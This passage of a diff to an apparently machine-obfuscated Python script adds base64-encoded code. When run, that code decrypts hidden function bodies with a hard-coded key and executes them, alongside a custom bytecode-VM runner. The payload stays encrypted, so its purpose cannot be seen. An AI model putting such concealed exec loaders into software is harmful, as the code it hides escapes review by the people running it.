QogICAgY3QgPSByYXdbMTY6LTE2XQogICAgYXV0aF9rZXkgPSBoYXNobGliLnNoYTI1NihiJ2F1dGh2MTonICsga2V5ICsgbm9uY2UpLmRpZ2VzdCgpCiAgICBpZiBub3QgaG1hYy5jb21wYXJlX2RpZ2VzdChoYXNobGliLnNoYTI1NihhdXRoX2tleSArIGN0KS5kaWdlc3QoKVs6MTZdLCB0YWcpOgogICAgICAgIHJhaXNlIFJ1bnRpbWVFcnJvcignW2Z1bmNlbmNdIGludGVncml0eSBjaGVjayBmYWlsZWQnKQogICAgZW5jX2tleSA9IGhhc2hsaWIuc2hhMjU2KGInZW5jdjE6JyArIGtleSArIG5vbmNlKS5kaWdlc3QoKQogICAgcGxhaW5fYnl0ZXMgPSBfeG9yX3N0cmVhbShlbmNfa2V5LCBjdCkKICAgIHBsYWluX3N0ciA9IHBsYWluX2J5dGVzLmRlY29kZSgndXRmLTgnKQogICAgbnMgPSB7fQogICAgZXhlYyhwbGFpbl9zdHIsIGdsb2JhbHMoKSwgbnMpCiAgICBmdW5jID0gbnNbJ19mJ10KICAgIF9GVU5DX0NBQ0hFW25hbWVdID0gZnVuYwogICAgcmVzdWx0ID0gYXdhaXQgZnVuYygqYXJncywgKiprd2FyZ3MpCiAgICByZXR1cm4gcmVzdWx0CgpkZWYgX3hvcl9zdHJlYW0oa2V5LCBkYXRhKToKICAgIHJlc3VsdCA9IGJ5dGVhcnJheSgpCiAgICBjb3VudGVyID0gMAogICAgd2hpbGUgbGVuKHJlc3VsdCkgPCBsZW4oZGF0YSk6CiAgICAgICAga3MgPSBoYXNobGliLnNoYTI1NihrZXkgKyBjb3VudGVyLnRvX2J5dGVzKDgsICdiaWcnKSkuZGlnZXN0KCkKICAgICAgICBjaHVuayA9IGRhdGFbbGVuKHJlc3VsdCk6bGVuKHJlc3VsdCkgKyAzMl0KICAgICAgICBmb3IgYSwgYiBpbiB6aXAoY2h1bmssIGtzKToKICAgICAgICAgICAgcmVzdWx0LmFwcGVuZChhIF4gYikKICAgICAgICBjb3VudGVyICs9IDEKICAgIHJldHVybiBieXRlcyhyZXN1bHQpCgpkZWYgX2IoKmFyZ3MsICoqa3dhcmdzKToKICAgIHJldHVybiBfZXhlY19lbmMoMCwgX0ZVTkNfS0VZLCAnX2InLCBhcmdzLCBrd2FyZ3MpCgpkZWYgX2QoKmFyZ3MsICoqa3dhcmdzKToKICAgIHJldHVybiBfZXhlY19lbmMoMSwgX0ZVTkNfS0VZLCAnX2QnLCBhcmdzLCBrd2FyZ3MpCgpkZWYgX2UoKmFyZ3MsICoqa3dhcmdzKToKICAgIHJldHVybiBfZXhlY19lbmMoMiwgX0ZVTkNfS0VZLCAnX2UnLCBhcmdzLCBrd2FyZ3Mp"), '<exec>', 'exec'), globals())
-    _vm_run(_c, _k, _m, globals(), locals(), _map, _ok)
+    _c, _k, _m, _map, _ok, _ht, _pf = _vm_deserialize(_pd)
+    exec(compile(_nekcm.b64decode("aW1wb3J0IGJhc2U2NAppbXBvcnQgaGFzaGxpYgppbXBvcnQgaG1hYwppbXBvcnQgY3R5cGVzCmltcG9ydCBiYXNlNjQKaW1wb3J0IGhhc2hsaWIKaW1wb3J0IGhtYWMKaW1wb3J0IGN0eXBlcwpfRlVOQ19LRVkgPSBiYXNlNjQuYjY0ZGVjb2RlKCcwQnN0RXphRFRkUVVFTHhYTmVJVVRyOHRJRjZ3T3FCdFV0aTJhbjFXcEhRPScpCl9GRU5DX0RBVEEgPSBbYmFzZTY0LmI2NGRlY29kZSgnNnE3NHRKWFF6am5nQXJIemF6WHBwc3k0N3BEV0xmSEFVUWpwcEJlc2M2c2d0ZHZ6aFVpbnQwTjA4ZGlrK2dHaGZ0R3JuQSthM3hacHAwVXJsM3ZYNEZlOVowNW9xVlc0bEswVHI0bG84eE5lcVVJRXN3VjZGM05wWGIwYTRacnpwcGpQOXZsblRiT1dLTHZ6L3dWVDBrZ0VsMzkzbUh2Q3JiK2d0ZHpzb2trV3Z4MVNOb2RUK3BkRUJSdUFNam1ObDJyYUNvMURlUVd1NzNxYkNQdE5uSlZoeG9UVTNEcjg3OCtaUjhxak11emdNaHFFL1puNUNUT3ZGc0NZT3JRdmFKM29CMmcwcEZKNExIaC9UZDc3TW16RFpyVnFmSUpHVlBHQnBnUmx3d0tHamc9PScpLCBiYXNlNjQuYjY0ZGVjb2RlKCdjYlBBS2s4a2xRT0t5b0QvbjhzS1A3Tk5URTBUWGk3clZaeGVBcE1DaGNGeEJsK2p3Nk1ZbE9RdEhJbGtGb2w5UWlKZ1BoRXF3QlR4aXRabHFaTzZZNFBVZXVtcjNpOE5nQ1lCbFY3Q1hTWjNvb1B2SDNrWjkrYU1KOE1kQ0xXYXdzUXpmUVJ6RkVtTHhwWk1qaG1lYWhuSDdOSTB0c3JzS3h4aDFFKy8xNUx2Mk1peUdQbmtUWUZpcGJmSThYTmxkNFgvcTJYdjZkRFZMdThyT2Q4MlhOSFByTHBQa0w1RWdYTjhkME5odHRHYkhUdklpa000QzcxaCtnNHhXN0VsTE1sTFlGVjZQb2F3QTlQTHFKalpCMUJ6OHlvPScpLCBiYXNlNjQuYjY0ZGVjb2RlKCcyY1lYOFB6Y2RCRE5id3hOMm9rVSthRWxyVEYyNWVWVEtXZlFTVjBwQ0U3blBVc1g4WXlRS1B2TXZsU3hObFg1T0trb21kOHl6Q0cvZ2dIV0JyMWZwVGwwODFqdnNZV2U1dzRnMDdNZkVzU0pJaXIzYVJmM0R1NFkyNWE4d0wyUlQ5Z0hkZVVKR2tGNFFlM1UwTHltVU9iZVVWSkxXT3h1eVhLalJNRVh1SlpnV2RMNGlldU85bmkrT0IvS3NqemQxaDFkaDE2a0VKamkrOGN3dnhRR29hYXp2eVoxWk9RQkdaaTVWcERmM3BmWThRRDZPN25FbVZTdUYveFNlTFkwV2xPcmRWT2M2RW9iMzRmYk9PRzE1ZmRTNTNUeTNyZlVLVTJvVmE1M1NCY2xCd2FFaC9LUFBQNzk2M3ZWRis3M01OcGQ5RmwwL25CWXkrWmR6ZGRFWnc9PScpLCBiYXNlNjQuYjY0ZGVjb2RlKCd4U1Bqb1hzOVZFa1UvVDRhOThnK2ViUjNPODJqTlQ0SDFoMUF6c0duSittZldNTEdTUjFTVHBJdTlGVG92dUdHK1lRTjlrYUVQVVBaU1RNb1A1VUExU1NnQUdjbDJRQXh2dWxic25aM0dDS0FBTlB4UWxxUXV6MXliRUM1cnJta29RaUxTUXBJSzh6WFR4dFgzNThaS2hLdC9PdXJvbkxoTHV6VHpMZXRiSXNJSDVxNlZDNDl2WW11cFdmZlU2Z1pXeFpTYjBuVy9ZNTBMOU8wTjNRL281eTdET1pNczR0bmhLNmVyYTZSMlE5eFZZK1pPUmpsdDdsNi9GcjdaZjJBTVVUTi9FZEd1Zjkxck5zSEtKVE9RUk5QVG43blVDZnJwckNXV1lnRGJHMVRNRUY4bzhIeUxYQlk4eUV1V2xWUHcxRXpaSzZ0ZzZlSjhFV0ZZQlJodExLRlB1V1RrRG11c013QmtxeGp5UEJKR3BGSzQ4K0JsUXZ2UmlHcDV6UXQydEREYUxQczNoNkg1TXlPUDVVQkJpN29IS0ZCR0dhbmpDcGxxRGNBckFQZG0zN3RrL3BiaVBaVE00QVlnK3RPV2RZcGNabmdiUG50TDZ0SUs3TnplYUN2UlZaT3BuallSeUlqRWcxejZENVpnSUZsNlNONENNTzVLV1N0K1dzWEVobzFNRVIrRkMwL0tRRXlvRElaTGVMMGFvNGFLaDhTeDd5NENIM3N6YjFuOXU1VHg5MjhFbmtCU2tLMDZGRkVzTGFtak5Ta2Y0aGk4SlVkSU5GQ1hqWWc3SlVVcG1jTDFacWt4bDh1Q1h6blJXbGhpR1QxYk42a2FvVnNHSFUyREhud1ZWOHU4SVZFTVNYaDBGakM3WkZyRXdZbWFOa0VNQ1dhMUNlVFo3WGRvQUJ6NHZadFI0MWtHTkxRZXVoYUtlbTkyVmtRZWZxWTZvSGduVEMvN05jMzJ5UWFLSGt2dE5wNWhrVzJ5TzZYQzF0cnZrMlZXdTZKV1c0dlhNYUhBUFlaRkJ6a21HemU5akdQcG5rSnMzTHNuT25CR3h6aG9wR0tVUXozekNKMS96ZUczYXZtdkhtQUpzUWJwSUEzVzdjSi9mL2VhdDJsSXNiN2liOE5FVWFKY3JTUEkwME5UdTU0dnJ1RDRLOUtJWHFhdlJRTTc0Ukp1elRIVDY3ZUhRT0NuRkVGMFJ3ejFLUHFoOTJrVlkwUVBiZlZnNUYxOXY1RXJSUVdoczUrZ1VPWmxXK29OdUNoaG4vL1R2dS80YmtXMGdrZlVWRHAyQ0hlbzMrNU5kaWt4Z1R4TmZScktLckxYdGJLNWNnQWVOVmVlNTAzdGFNUWQ3VVRnQkVGb0U0bUdKcCtib2FjMDluOTNZQUkrSnhuOCtjekVuV2dzcW9GOStGSkxIeUNwMThvaUxJNXh0Z3N1azNzTks1MDRZMXFUU2tiQ1ZMR2ZCWlJHcGVIcThDQWZmYUxJODFXcVRvS3YrOW5rMjZQTlFrM09PNk53N29nNlk3blRQcTlGb01OS1FQWFRvNFNCMEpvOGpWQmNSN3l6cm9pTUtwSmdWT2RVWHZMZi84cHJZQ0dkamZKcHkvczJOTTcwek1JQmhmbGlpRjc3ZmZXVDE0eW5UOGFKNisvZzVlR3RoSlR5aHpZN1VjNGcydFA5OVFOU1ViUWxwaUJaSjBEWFUvck5jL2ppN0V0SjIxdDdSa1FoNzY1S04xSUZkUk5wZTlKYk9jenJwNFpwRmRlVHUySlNhMWVUd2d5NFlJQjhaQ2RleGdpTlZoVkxIZEc5SkxLZDZHa2ZqeS9WUTlxN0dldVIwT3dmV1RmOWR1V1duYzFsSjlBS1YxelNBQ2ViWUtmYXhKaXdGbVAzVHB0aW1UUkJZc3UwaXJIbDQvMkhaMVVKSlptWXRXcjYxeVIzaUxZeDdvbTlhakNwQ04wbUxMRExlaDAvNmZWKzRYWjc3cFF6MlJCZFhPdHFRTC9kZy9Xb0sxcXpSaGc5MGpqMkVHNUtRUTR6Z0ZPODg5VndxUXp1R3RDdXpCRUdLK1NSY25xMmZTTjV0RTBDRmVvZjdML2Q5Qm1yZUp4ajh1Z3NiRUszNGRmNlpOb1ZDVEszK2tlRG1yK2hUOTd5R1lVNWhSZzdvd0tHZEROZ3hNQ1dLZFZsNjJkamI2MFUyeEdkb3ZwdGdRZW5xc28vWktJaUJJeWxWT2JMZHFjWTQ2TnYvWVlBL3FGRktlSVp5RDRaZzBMWWdEOTR2S3p3R1VSNHNQWVVQT2VObk4wbUdVU0dGbXBkS1RVOHJkRGNRMmF6RG4zdlBucm4vQ2NCbkZMM2VSYkIxYy9jRFNhbE9QZUxhbG82QzhWeHJaWnVEUnNNMlh2dTNuTHpGTks0L2dESGlmUHZxRW1XSjZwMTM3cUtGZ3hhVTk2Y0Nkb2FaQ3RQRXJGb0NWOG5yMExTTTI4M3R6WHZLTzJpQlBGMjVlSWRoNEtORk92c29ZVytVdE53YVdDY2Nra3F4Y2JMRUNmWnhFdmN4dkx5ZndIaWVBTm1taCtsdXZ6NnZmUzh4RGQxR2hxMVM5SlRPZXVkRXkwdFlkZThBcEpQbHpTNzJJa1NTcS9FS0lGR0cwcjM1eHVSbTdMLzBvTzl5ZWJndlRFdEtMN1BCM2k5VmRuR0VoRTBDaTgzNE02QUNqNXZVZG9oYXYycGVZb3dPNGwwQUFNdDV2RXM2b1RYNThlYkI2M3RmZ2F4WkdVWHVJaGxnMi9Pb2d3UUFHaVczOFlTa3ZlK01vQ0RuYU1BRzdualVIemZpZjVwR3h5Y1pGU2ZmUHZCeGwxMWF2U01JU1R6WUF0SWEvN2JtVlM3bGJ4OTRIWkdCbFVYeXd1NEpoZkRFMzNsOGczMjhLejlTR0MxLzhrWGNtek5XQlU3b1hON2hQSWNRekF5RzAxdHFWajlJb3JPMGlJM3NuRWJOcXEvTUZIc3ZIeE50djB4ZXpCUFdTdU1wbExFOWM3NURIYndlWlRwLzE0U0xvOUFwcXB0ZWhyVDFaRkxjRFRWRk81OFh5QWhZa0lCZ2VLZmpoazV2b2pxQ2I4Q0Y0SWFXdE1uUS92VDlNRzhMSldWeVFWUDB2bnZGRHhTOGRmYnBrQ1hGOUt6bmE1ZDFvT1BJKzFMenZaKzMxNnNBbWpub2Y4Rnp5VHdyZUh1eTV0Q1k5STZUMWU3K1dUUlc5TVhOd2tiZy9WL2RDeFI3WmVrRXZMa1ExenVJbDZ6akgwSGJLM0FYQU1pZGVxWERLVUx1ajArc3UvbkNWQWdKNnRjdjdtYUNkVW1XQkx4Ti9WVXJIYkZQSVFDK2ZiTUlLazl3cW0yZUs0bDdvY0JIelBocTd6eTZ5a3htZVFNVFN1WnVPcHFnVnMrckxHb2VtTnJ1Vk9rWkgxN2p2VlBMdWZyUFgxWEJNYlo0MGZZb2orSnpCRWxHRzE0VHV2aXJpanJyS24xZnpRRDRwS0tSa3BTMlQwcUMwcE9uay94ZmszUE5jeGU4b0ZOeExqK2s0cVQrWTFmNVFhcy8wRU42bUNqN2RSVnlEcHY2TDhtU0JoSkVERVBlKzVNQzYwMnNnQUZwc3hscStPMVhnWG50UEtWWGNHU0I1R2tTaUtxYUxlcEpnUzZtM3Qxemg0TnRhcVBia2VmSTNza3NkYUtsUG52K0grY2QzM0ZxMFNlSW14SHJHVGN2ZTRWY3hmSkVaTjV1SndzbjNEQ2JLMHJ4K3U1VTQwdW54OUp5T29SVDNQdENJMTRXNjIvbWRxc2FaanBuZ1djRGtDNjY5K0FNUEJvQk12RDNLajdGR1FOT2VJWTBGM0R6YkFBbVRoMnJuKzBMZDFQZkpKS3B1bldET2dMTlR0ZUo1WEhjWituUHRsUFRsdFZ1Y3E2T01pc1gwNTdnRlBjTzloWks3UW1uc1V4Unk2T1VsLzdySTcrKytqeGRPUHJKNk1xcjhhSzJkcm5sYnhWTkZORVVwTlRoYlg1VVdvQ25UOENQMlZUZzg3UTZiMTFBVGxsUEh5WEo1L3JDMG5FQWZiNTNod3BmYnJXbmV6UktJUmZPdEFuMGlycjdUN3BlV2c0Vy9Sd1FRYWZrWmRlQWRoMU5KRUhtVmFldTdWMUN6OVlYdXZ6WW4rcFVKcVNUS2RIbUY4UVhDN0ljY2lxNE5rc1lmVWhzbEpmTnBiSThteFZleFBFVkg4Zm1PUUNaL2lBVW5SWmFMc0xZcFhBVFdZMFFBMVZnajloWVQ5TzdMV0FuZHpoMCtlMk5sNW9PdmI0NnBTbm03Tkhrdlp6Qk1KMkpoOGtIME8wRVFaZVM1TXNkWngrcmdvZXpscnEwcVl3czVKN3ZaSEo1WkdoVGtQN1Bhb1FiM01aaEtsZXU4OGY5VnM3Tnlua25kSTNXbm00cWVzZlh1V1l2aVNiMjdkSEdZR1hRZWhUYy82QXZGQjc0ejB1Z0d1UnlvbXdzTytZenpmTUpBNEpWbXJiMGlPeUtnTXRrdVlvdHhPc09lQUpSUjhuUnpUMERZaHY4eVUxK2pIUlNvdzVPZGl2eDZIb3VjaHAvajE5cjJzbWQzUHFxeTFYTHcybjJxdVczbTQ2eWVFSzJQSlJLZGxGN1dOV3hhcitPVmxyNFJ5UC9qMEZkYXRoMkVoa1ozOTlSZUR1U0dOMVpWWU5Ick5pc1hLVTVwWXRJcnRhbDFxWFZXNHZHVTNZZnV1SWhnbm9NZ2pTVU9jZUtUcERIR1hNMU9zWXJiWmtKZE9RelZTZEJENWgwWTBQeDJ0MlRGRHVrSTE3V20zcHF6N3JscVp6MUtMVTJVdmdhWk5YVzdGamI3RlhKZDFGOGlhZCt5cVF5cGxnZGU2SGgxQzl2RXQvam91RkJ2VWRvaGN6WG9CeWJnZWFTaSs3b3RWRjA1WlVUWnEwZHF3WndKOURGNkV3aU9EN1pHM3NwQ1d5Y1hRaFpReDk4S3lzTVFmaUZXY3ZUWksxTXQySXNKMUhxNlpYY1h3anpyRncxS1VaN0V4ZFl1WVROWDNLZ0NWelVPRGw0R0VoazZCdDRseGdhU3Y0cTFpUjBOV3BiN3BXYXN0a3pQNzhVWWN5b2s3SWd1OUN2amJGNlZ5cFU2K3ZjSkxuT0lYQ0VpN2MxMXlBbUZoQ0ZXWEV4ZndTd0ZoR29aeitxREJJVEpCeE0rbDYyOXR0R3JaM05COFRFTktobVF2MFh4aDQ4YTg3bVNHUkgzdHAyanVHTWxDV09GMW10YWttUFlyOHpnbDRIYVp0MGpLb0UzZ25pYndkdlFxcGt4V1Nua0UyUEE4eTgrTFZRUCs0ak1HcDFqWGI0TzZUbm85VUVaRDUybkI0NjZzNzVvcTFVQzdPdHU0K2NrWHZOUlNKall1S3hZSlJFcVFqL0NZM2xTdkVUOEwyblRZOHh0enlwTUpRNzNSWGFsRmtkR1R4VHlEVVdQWnZUeU1YSHo1VzZBWTZEd3dhclp3SEF6SS82UlFEd0VMckZzWWFoaHFWYTRxWS9FNnJOOGUwS1lxMzh1OUlmU2c0ZlpMSHN5eFpiZndNNWdITnJQSitaR1FNY25CRHRLa01adDVQSGxubjY1Y2VZWWZLRFVxWHY1aDBodjJSUStNOCtiTFhqbzZNN2tQa0h5UWtjaDhmNXU4THNZdmIyMi9XdlZWdW5RS3c4WCs0dm1NQno0SVNjb0JRd2JpazhvajFWYnA0N2s2T3NqTkVmWXkwcG42eWEwcEVmRk04M0RLWkE3cElyZDc1ZGM2ajdHUTlOenAxcW96TzUyZWFSWjM2SXozeTRJeEFQbmtkOXVKWDNlbnBuMW5mbWgvcVA0dXZ0LzBpM0J5WFlzTnNJN3BCSzhkUUR4U2Rhd1E2dEVtYys3SW80WDdvYzRaaDlBVXp6WnNqUT09JyldCl9GVU5DX0NBQ0hFID0ge30KCmRlZiBfZXhlY19lbmMoaWR4LCBrZXksIG5hbWUsIGFyZ3MsIGt3YXJncyk6CiAgICBpZiBuYW1lIGluIF9GVU5DX0NBQ0hFOgogICAgICAgIHJldHVybiBfRlVOQ19DQUNIRVtuYW1lXSgqYXJncywgKiprd2FyZ3MpCiAgICByYXcgPSBfRkVOQ19EQVRBW2lkeF0KICAgIG5vbmNlLCB0YWcgPSAocmF3WzoxNl0sIHJhd1stMTY6XSkKICAgIGN0ID0gcmF3WzE2Oi0xNl0KICAgIGF1dGhfa2V5ID0gaGFzaGxpYi5zaGEyNTYoYidhdXRodjE6JyArIGtleSArIG5vbmNlKS5kaWdlc3QoKQogICAgaWYgbm90IGhtYWMuY29tcGFyZV9kaWdlc3QoaGFzaGxpYi5zaGEyNTYoYXV0aF9rZXkgKyBjdCkuZGlnZXN0KClbOjE2XSwgdGFnKToKICAgICAgICByYWlzZSBSdW50aW1lRXJyb3IoJ1tmdW5jZW5jXSBpbnRlZ3JpdHkgY2hlY2sgZmFpbGVkJykKICAgIGVuY19rZXkgPSBoYXNobGliLnNoYTI1NihiJ2VuY3YxOicgKyBrZXkgKyBub25jZSkuZGlnZXN0KCkKICAgIHBsYWluX2J5dGVzID0gX3hvcl9zdHJlYW0oZW5jX2tleSwgY3QpCiAgICBwbGFpbl9zdHIgPSBwbGFpbl9ieXRlcy5kZWNvZGUoJ3V0Zi04JykKICAgIG5zID0ge30KICAgIGV4ZWMocGxhaW5fc3RyLCBnbG9iYWxzKCksIG5zKQogICAgZnVuYyA9IG5zWydfZiddCiAgICBfRlVOQ19DQUNIRVtuYW1lXSA9IGZ1bmMKICAgIHJlc3VsdCA9IGZ1bmMoKmFyZ3MsICoqa3dhcmdzKQogICAgcmV0dXJuIHJlc3VsdAoKYXN5bmMgZGVmIF9leGVjX2VuY19hc3luYyhpZHgsIGtleSwgbmFtZSwgYXJncywga3dhcmdzKToKICAgIGlmIG5hbWUgaW4gX0ZVTkNfQ0FDSEU6CiAgICAgICAgcmV0dXJuIGF3YWl0IF9GVU5DX0NBQ0hFW25hbWVdKCphcmdzLCAqKmt3YXJncykKICAgIHJhdyA9IF9GRU5DX0RBVEFbaWR4XQogICAgbm9uY2UsIHRhZyA9IChyYXdbOjE2XSwgcmF3Wy0xNjpdKQogICAgY3QgPSByYXdbMTY6LTE2XQogICAgYXV0aF9rZXkgPSBoYXNobGliLnNoYTI1NihiJ2F1dGh2MTonICsga2V5ICsgbm9uY2UpLmRpZ2VzdCgpCiAgICBpZiBub3QgaG1hYy5jb21wYXJlX2RpZ2VzdChoYXNobGliLnNoYTI1NihhdXRoX2tleSArIGN0KS5kaWdlc3QoKVs6MTZdLCB0YWcpOgogICAgICAgIHJhaXNlIFJ1bnRpbWVFcnJvcignW2Z1bmNlbmNdIGludGVncml0eSBjaGVjayBmYWlsZWQnKQogICAgZW5jX2tleSA9IGhhc2hsaWIuc2hhMjU2KGInZW5jdjE6JyArIGtleSArIG5vbmNlKS5kaWdlc3QoKQogICAgcGxhaW5fYnl0ZXMgPSBfeG9yX3N0cmVhbShlbmNfa2V5LCBjdCkKICAgIHBsYWluX3N0ciA9IHBsYWluX2J5dGVzLmRlY29kZSgndXRmLTgnKQogICAgbnMgPSB7fQogICAgZXhlYyhwbGFpbl9zdHIsIGdsb2JhbHMoKSwgbnMpCiAgICBmdW5jID0gbnNbJ19mJ10KICAgIF9GVU5DX0NBQ0hFW25hbWVdID0gZnVuYwogICAgcmVzdWx0ID0gYXdhaXQgZnVuYygqYXJncywgKiprd2FyZ3MpCiAgICByZXR1cm4gcmVzdWx0CgpkZWYgX3hvcl9zdHJlYW0oa2V5LCBkYXRhKToKICAgIHJlc3VsdCA9IGJ5dGVhcnJheSgpCiAgICBjb3VudGVyID0gMAogICAgd2hpbGUgbGVuKHJlc3VsdCkgPCBsZW4oZGF0YSk6CiAgICAgICAga3MgPSBoYXNobGliLnNoYTI1NihrZXkgKyBjb3VudGVyLnRvX2J5dGVzKDgsICdiaWcnKSkuZGlnZXN0KCkKICAgICAgICBjaHVuayA9IGRhdGFbbGVuKHJlc3VsdCk6bGVuKHJlc3VsdCkgKyAzMl0KICAgICAgICBmb3IgYSwgYiBpbiB6aXAoY2h1bmssIGtzKToKICAgICAgICAgICAgcmVzdWx0LmFwcGVuZChhIF4gYikKICAgICAgICBjb3VudGVyICs9IDEKICAgIHJldHVybiBieXRlcyhyZXN1bHQpCgpkZWYgX2IoKmFyZ3MsICoqa3dhcmdzKToKICAgIHJldHVybiBfZXhlY19lbmMoMCwgX0ZVTkNfS0VZLCAnX2InLCBhcmdzLCBrd2FyZ3MpCgpkZWYgX2UoKmFyZ3MsICoqa3dhcmdzKToKICAgIHJldHVybiBfZXhlY19lbmMoMSwgX0ZVTkNfS0VZLCAnX2UnLCBhcmdzLCBrd2FyZ3MpCgpkZWYgX2YoKmFyZ3MsICoqa3dhcmdzKToKICAgIHJldHVybiBfZXhlY19lbmMoMiwgX0ZVTkNfS0VZLCAnX2YnLCBhcmdzLCBrd2FyZ3MpCgpkZWYgX2coKmFyZ3MsICoqa3dhcmdzKToKICAgIHJldHVybiBfZXhlY19lbmMoMywgX0ZVTkNfS0VZLCAnX2cnLCBhcmdzLCBrd2FyZ3Mp"), '<exec>', 'exec'), globals())
+    _vm_run(_c, _k, _m, globals(), locals(), _map, _ok, _ht, _pf)
 if __name__ == '__main__':
-    _ralpr()
+    _ibqzcl()
